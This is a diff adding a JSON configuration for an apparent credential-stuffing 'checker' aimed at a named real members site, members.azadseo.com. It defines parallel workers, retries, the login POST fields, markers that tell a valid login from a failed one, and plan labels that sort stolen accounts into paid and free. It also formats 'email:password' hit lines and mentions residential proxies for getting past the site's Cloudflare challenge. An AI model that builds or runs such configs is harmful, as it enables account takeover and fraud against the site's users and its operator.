@@ -1,0 +1,62 @@
+{
+  "id": "azadseo",
+  "name": "AzadSEO",
+  "description": "aMember group-buy login at members.azadseo.com — no login_attempt_id",
+  "source_capture": "task_20260614_013022",
+  "settings": {
+    "workers": 20,
+    "timeout_seconds": 45,
+    "retry_on_error": 5,
+    "delay_ms": 150
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "variables": {
+    "base_url": "https://members.azadseo.com",
+    "login_url": "https://members.azadseo.com/login",
+    "login_referer": "https://members.azadseo.com/login",
+    "member_url": "https://members.azadseo.com/member",
+    "payment_history_url": "https://members.azadseo.com/member/payment-history"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "GET /login — aMember sign-in form",
+      "method": "GET",
+      "url": "{{login_url}}"
+    },
+    {
+      "id": "login_post",
+      "name": "POST form login (amember_login, amember_pass, _referer)",
+      "method": "POST",
+      "url": "{{login_url}}",
+      "body": "application/x-www-form-urlencoded"
+    },
+    {
+      "id": "member",
+      "name": "GET /member — subscription + group-buy tools",
+      "method": "GET",
+      "url": "{{member_url}}",
+      "optional": true
+    }
+  ],
+  "plan_labels": {
+    "PAID": { "label": "PAID" },
+    "FREE": { "label": "FREE" },
+    "FREE_TRIAL": { "label": "FREE_TRIAL" },
+    "UNKNOWN": { "label": "UNKNOWN" },
+    "EXPIRED": { "label": "EXPIRED" }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
+    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
+    "console_fail": "[FAIL] {{email}} | {{reason}}"
+  },
+  "notes": [
+    "No login_attempt_id on this site — POST only amember_login, amember_pass, _referer.",
+    "Success: redirect to /member (group-buy dashboard with tool logos).",
+    "Failure: div.am-errors — 'The user name or password is incorrect'.",
+    "FREE: #no_subscription or no active plans on /member.",
+    "PAID: subscription-item on /member or accessible /member/go/* tool links.",
+    "Cloudflare challenge on login may need residential proxy."
+  ]
+}
